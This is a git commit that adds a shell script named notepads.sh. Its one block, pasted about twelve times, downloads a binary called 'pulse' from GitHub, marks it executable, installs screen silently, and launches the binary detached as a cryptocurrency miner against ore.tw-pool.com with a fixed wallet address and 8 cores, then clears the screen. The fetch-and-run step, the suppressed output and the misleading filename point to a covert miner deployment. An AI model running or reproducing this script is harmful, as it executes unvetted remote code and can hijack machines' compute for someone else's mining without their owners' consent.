402ddac31b8e8a7fd37d758b591670ffb55da38f
obisumila <obisumila@gmail.com>
2024-09-24 16:24:16 +0800

    Add files via upload

---
+++ notepads.sh
@@ -0,0 +1,117 @@
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/turbo-octo-potato/raw/refs/heads/main/pulse ;
+chmod +x pulse ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./pulse --url ws://ore.tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.FALCON --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
